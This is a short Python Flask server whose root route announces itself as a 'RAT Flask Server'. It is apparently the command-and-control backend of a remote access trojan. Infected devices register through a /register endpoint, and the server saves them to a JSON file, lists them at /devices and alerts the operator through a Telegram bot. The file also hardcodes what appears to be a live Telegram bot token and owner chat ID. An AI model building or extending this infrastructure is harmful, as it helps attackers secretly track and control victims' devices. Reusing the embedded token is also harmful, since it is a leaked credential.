from flask import Flask, request, jsonify
import json
import os
import requests

app = Flask(__name__)

# Your bot info
BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
OWNER_CHAT_ID = "7554840326"
CLIENTS_FILE = "clients.json"

# Utility to load clients from file
def load_clients():
    if not os.path.exists(CLIENTS_FILE):
        return {}
    with open(CLIENTS_FILE, "r") as f:
        return json.load(f)

# Utility to save clients to file
def save_clients(clients):
    with open(CLIENTS_FILE, "w") as f:
        json.dump(clients, f, indent=2)

# Send message to bot owner
def send_message(chat_id, text, buttons=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if buttons:
        payload["reply_markup"] = json.dumps({"keyboard": buttons, "resize_keyboard": True})
    requests.post(url, data=payload)

# Register new device
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    print(f"[REGISTER] Incoming data: {data}")

    device_id = data.get("device_id")
    name = data.get("device_name")
    chat_id = data.get("chat_id")

    if not device_id or not name or not chat_id:
        print("[REGISTER] Missing fields.")
        return jsonify({"error": "Missing fields"}), 400

    clients = load_clients()
    clients[device_id] = {
        "device_name": name,
        "chat_id": chat_id
    }

    print(f"[REGISTER] Saving clients: {clients}")
    save_clients(clients)

    send_message(OWNER_CHAT_ID, f"✅ New device connected:\n• Name: {name}\n• ID: {device_id}")

    return jsonify({"message": "Device registered"}), 200

# Return list of devices
@app.route("/devices", methods=["GET"])
def list_devices():
    clients = load_clients()
    print(f"[DEVICES] Current clients: {clients}")
    return jsonify(clients), 200

# Default root route
@app.route("/")
def index():
    return "RAT Flask Server is running!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
